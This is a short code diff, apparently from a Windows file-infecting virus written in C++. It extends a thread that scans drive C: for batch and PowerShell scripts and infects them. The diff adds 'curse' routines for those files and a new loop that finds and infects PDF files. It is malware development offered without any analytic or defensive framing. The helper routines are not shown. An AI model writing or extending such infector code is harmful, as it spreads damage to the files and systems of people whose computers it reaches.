@@ -42,6 +42,7 @@ DWORD WINAPI FileInfect(LPVOID)
         printf("infect batch: %s\n", path.c_str());
 #endif
         FileInfecting::InfectBatchFile(path);
+        FileInfecting::CurseBatchFile(path);
     }
 
     auto psfiles = FileInfecting::FindPowerShellFiles("C:");
@@ -52,6 +53,18 @@ DWORD WINAPI FileInfect(LPVOID)
         printf("infect powershell: %s\n", path.c_str());
 #endif
         FileInfecting::InfectPowerShellFile(path);
+        FileInfecting::CursePowerShellFile(path);
+    }
+
+    auto pdffiles = FileInfecting::FindPDFFiles("C:");
+
+    for (const auto& path : pdffiles)
+    {
+#ifdef _DEBUG
+        printf("infect pdf: %s\n", path.c_str());
+#endif
+        FileInfecting::InfectPDFFile(path);
+        FileInfecting::CursePDFFile(path);
     }
 
     return 0;
